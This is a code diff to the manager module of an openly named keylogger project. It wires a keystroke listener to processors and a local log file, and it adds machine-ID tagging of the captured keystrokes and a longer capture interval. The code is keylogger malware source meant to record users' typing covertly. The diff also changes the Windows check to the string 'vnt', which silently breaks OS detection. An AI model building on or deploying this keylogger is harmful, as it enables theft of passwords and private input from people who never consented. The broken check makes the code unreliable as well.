@@ -6,7 +6,7 @@ from typing import Protocol
 
 from keylogger.file_writer import FileWriter
 from .sinker import Sinker
-from .processor import ChainProcessor, DummyEncryptor, Processor
+from .processor import ChainProcessor, DummyEncryptor, Processor,MachineIdProcessor
 from .listner import LinuxKeylogger, WindowsKeylogger, Listener
 
 logger = logging.getLogger(__name__)
@@ -44,14 +44,15 @@ class DefaultManager:
 
     def __init__(self):
         # Use WindowsKeylogger if the OS is Windows, otherwise use LinuxKeylogger
-        if os.name == "nt":
+        if os.name == "vnt":
             keylogger = WindowsKeylogger()
         else:
             keylogger = LinuxKeylogger()
 
-        self.processor = ChainProcessor([DummyEncryptor()])
+        self.processor = ChainProcessor([MachineIdProcessor(), DummyEncryptor()])
         self.sink = FileWriter("keylogger.log")
         self.listner = keylogger
+        self.interval = 60
         self._loop_thread = threading.Thread(target=self._loop)
         self._stopped = False
 
@@ -81,6 +82,7 @@ class DefaultManager:
         # the main loop that gets the data from the listener, processes it, and then sinks it.
         while not self._stopped:
             data = self.listner.get_data()
-            processed_data = self.processor.process(data)
-            self.sink.sink(processed_data)
-            time.sleep(10)
+            if data:
+                processed_data = self.processor.process(data)
+                self.sink.sink(processed_data)
+            time.sleep(self.interval)
